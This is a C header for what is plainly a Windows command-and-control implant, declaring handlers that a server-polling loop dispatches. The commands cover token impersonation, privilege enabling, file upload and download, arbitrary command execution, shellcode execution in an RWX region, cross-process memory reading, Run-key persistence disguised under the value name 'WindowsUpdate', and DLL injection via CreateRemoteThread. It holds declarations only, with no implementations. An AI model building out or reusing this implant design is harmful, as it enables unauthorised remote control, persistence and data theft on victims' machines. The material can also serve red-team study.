#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN //claude 
#endif
#include <windows.h>
#include <winsock2.h>
#include "debug.h"
#include "error.h"
#include "generated_commands.h"
#include "security.h"
#include "exports.h"

typedef DWORD (*CommandFunction)(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

typedef struct _COMMAND_MAP
{
	CMD_ID id;
	CommandFunction handler;
} COMMAND_MAP;

extern CONST COMMAND_MAP G_CommandTable[];

/**
 * @brief Executes a command synchronously by command ID.
 *
 * This function is called by the polling loop after a queued task has been
 * retrieved from the server.
 *
 * @param cmdId The numeric command identifier from the task.
 * @param dataLen The command argument payload length in bytes.
 * @param data The command argument buffer.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD ExecuteCommandById(
	DWORD cmdId,
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Handles the killimplant command.
 *
 * Marks the implant for termination so the polling loop exits cleanly after
 * the current task completes.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdKillImplant(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns a summary of the current process token.
 *
 * The current implementation returns a TOKEN_SUMMARY payload containing the
 * user name, user SID, elevation state, and whether the current thread is
 * impersonating.
 *
 * @param dataLen The command argument length in bytes. Unused by this handler.
 * @param data The command argument buffer. Unused by this handler.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdCurrentToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns a summary of a target process token.
 *
 * The intended response should mirror CmdCurrentToken so the Python client can
 * parse local and remote token summaries consistently.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdProcessToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the privileges present on a target process token.
 *
 * The response format should enumerate each privilege and its enabled state in
 * a binary payload understood by the Python display handler.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdTokenPrivileges(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Attempts to impersonate the token of a target process.
 *
 * This command reports a numeric success or failure code and the
 * user name of the owner of the impersonated token.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdImpersonateToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Attempts to enable a named privilege on the current process token.
 *
 * The request payload is expected to contain a UTF-8 privilege name string.
 * This command reports a numeric success or failure code and whether the
 * privilege was previously enabled.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the privilege name.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdEnablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Attempts to disable a named privilege on the current process token.
 *
 * The request payload is expected to contain a UTF-8 privilege name string.
 * Uses the same wire format as CmdEnablePrivilege but sets the privilege
 * attribute to zero rather than SE_PRIVILEGE_ENABLED.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the privilege name.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdDisablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Lists the contents of a directory at the given path.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing a UTF-8 path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdLs(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the contents of a file at the given path.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing a UTF-8 path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdCat(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Creates a directory at the given path.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing a UTF-8 path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdMkdir(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Deletes a file or directory at the given path.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing a UTF-8 path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdRm(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Receives a file from the operator and writes it to the given remote path.
 *
 * The request payload uses the binary format produced by the Python client
 * encode_upload_chunk helper: [PathLen:DWORD][PathUTF16LE][Offset:QWORD]
 * [DataLen:DWORD][Data]. Offset zero creates the file; non-zero seeks before
 * writing to support chunked transfers of large files.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the encoded chunk.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdUpload(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Reads a file from the implant host and returns its contents to the operator.
 *
 * The request payload contains the remote path encoded as UTF-16LE. The
 * response uses the same layout as CmdCat: [FileSize:DWORD][Bytes].
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the UTF-16LE remote path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdDownload(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Lists all running processes with their PID and image name.
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdPs(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the NetBIOS hostname of the local machine.
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdHostname(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the process ID of the implant.
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdGetPid(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Displays the current security context of the implant.
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdWhoami(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief execute a program or command and return output, exit status, or error information
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdExec(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Executes raw shellcode loaded from a file path on disk.
 *
 * Reads the file at the UTF-8 path supplied in the request, allocates an
 * RWX region, copies the shellcode into it, and executes it in a new thread.
 * Waits for the thread to complete before returning the exit code.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the UTF-8 file path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdShellcodeExec(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Reads a region of memory from a target process.
 *
 * The request payload format is [PID:DWORD][Address:QWORD][Size:DWORD].
 * The response format is [BytesRead:DWORD][Bytes].
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the PID, address, and size.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdMemRead(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Lists the loaded modules of a target process including their base addresses.
 *
 * The request payload contains the target PID as a DWORD. The response format
 * is [PID:DWORD][Count:DWORD] followed by per-module entries of
 * [BaseAddr:QWORD][NameLen:DWORD][NameUTF16LE].
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdModuleList(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Lists all open handles for a target process.
 *
 * Uses NtQuerySystemInformation to enumerate system handles, filters by the
 * target PID, and duplicates each handle to determine its type and name.
 * The request payload contains the target PID as a DWORD. The response format
 * is [PID:DWORD][Count:DWORD] followed by per-handle entries of
 * [Handle:QWORD][TypeLen:DWORD][TypeUTF16LE][NameLen:DWORD][NameUTF16LE].
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdHandleList(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief  list all environment variables for the current process
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdEnv(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the value of a single named environment variable.
 *
 * The request payload contains the variable name as a UTF-8 string.
 * The response format is [ValueLenBytes:DWORD][ValueUTF16LE].
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the UTF-8 variable name.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdGetEnv(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Creates or modifies an environment variable in the implant process.
 *
 * The request payload format is [NameLen:DWORD][NameUTF8][ValueLen:DWORD][ValueUTF8].
 * The response format is [Status:DWORD].
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the encoded name and value.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdSetEnv(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Changes the implant polling interval.
 *
 * The request payload contains the new interval in milliseconds as a DWORD.
 * The response echoes the new interval back as [IntervalMs:DWORD].
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the interval in milliseconds.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdSleep(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Installs persistence by writing the current executable path to the Run registry key.
 *
 * Writes to HKCU\Software\Microsoft\Windows\CurrentVersion\Run under the
 * value name "WindowsUpdate". The response format is [Status:DWORD].
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdPersist(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Removes the Run registry persistence entry installed by CmdPersist.
 *
 * Deletes the "WindowsUpdate" value from
 * HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
 * The response format is [Status:DWORD].
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdUnpersist(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Injects the implant DLL into another process via CreateRemoteThread.
 *
 * Writes the current DLL path into the target process memory and calls
 * LoadLibraryW via CreateRemoteThread. The request payload contains the
 * target PID as a DWORD. The response format is [Status:DWORD][TargetPID:DWORD].
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdMigrate(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);
